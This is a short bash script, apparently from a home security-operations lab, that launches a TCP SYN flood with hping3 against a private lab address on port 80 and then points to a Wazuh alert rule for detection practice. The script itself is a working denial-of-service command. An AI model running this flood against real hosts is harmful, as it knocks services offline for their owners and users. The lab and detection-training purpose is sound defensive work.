#!/bin/bash
# Mini SOC Lab - SYN Flood DoS Simulation
# MITRE ATT&CK: T1498.001 - Network Denial of Service
# DISCLAIMER: For educational and lab use only.

TARGET="192.168.56.106"

# Check if running as root (hping3 requires raw sockets)
if [ "$EUID" -ne 0 ]; then
  echo "[-] Error: This script must be run as root (sudo ./syn-flood.sh)"
  exit 1
fi

echo "[*] Launching TCP SYN Flood against $TARGET on port 80..."
echo "[!] Press CTRL+C to stop the flood!"
echo ""

# Launch the flood
hping3 -S --flood -p 80 -V $TARGET

echo ""
echo "[+] Flood stopped. Check Wazuh Rule 5710 (Level 12)."
